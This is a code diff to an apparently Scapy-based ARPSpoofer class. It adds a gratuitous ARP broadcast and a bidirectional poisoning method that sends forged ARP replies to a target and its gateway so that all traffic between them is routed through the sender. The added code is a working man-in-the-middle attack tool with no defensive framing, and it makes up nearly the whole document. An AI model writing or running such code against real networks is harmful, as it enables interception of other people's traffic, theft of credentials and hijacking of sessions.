@@ -116,6 +116,53 @@ class ARPSpoofer:
         sendp(pkt, verbose=0, iface=self.interface)
         self.packet_count += 1
 
+    def gratuitous_arp(self):
+        """
+        Send gratuitous ARP for 3x faster cache poisoning.
+
+        Gratuitous ARP: broadcast ARP reply where psrc = pdst
+        Instantly updates all hosts' ARP caches (RFC 826)
+        From TCP/IP Illustrated Vol 1 Ch4
+        """
+        pkt = Ether(dst="ff:ff:ff:ff:ff:ff") / \
+              ARP(op=2,                      # ARP reply
+                  psrc=self.spoof_ip,        # IP we're claiming
+                  pdst=self.spoof_ip,        # Same (gratuitous marker)
+                  hwsrc=self.our_mac)        # Our MAC
+
+        sendp(pkt, verbose=0, iface=self.interface)
+        self.log(f"Sent gratuitous ARP claiming {self.spoof_ip}", "DEBUG")
+
+    def poison_bidirectional(self, gateway_ip, gateway_mac):
+        """
+        Bidirectional ARP poisoning (full MITM).
+
+        Poisons BOTH target and gateway:
+        - Tell target: "Gateway is at our MAC"
+        - Tell gateway: "Target is at our MAC"
+
+        Result: All traffic between target ↔ gateway flows through us.
+        """
+        # Poison target (tell target gateway is us)
+        pkt_to_target = Ether(dst=self.target_mac, src=self.our_mac) / \
+                        ARP(op=2,
+                            psrc=gateway_ip,      # Gateway IP
+                            hwsrc=self.our_mac,   # Our MAC (lie)
+                            pdst=self.target_ip,
+                            hwdst=self.target_mac)
+
+        # Poison gateway (tell gateway target is us)
+        pkt_to_gateway = Ether(dst=gateway_mac, src=self.our_mac) / \
+                         ARP(op=2,
+                             psrc=self.target_ip,   # Target IP
+                             hwsrc=self.our_mac,    # Our MAC (lie)
+                             pdst=gateway_ip,
+                             hwdst=gateway_mac)
+
+        sendp(pkt_to_target, verbose=0, iface=self.interface)
+        sendp(pkt_to_gateway, verbose=0, iface=self.interface)
+        self.packet_count += 2
+
     def restore(self):
         """
         Restore target's ARP cache to correct mapping.
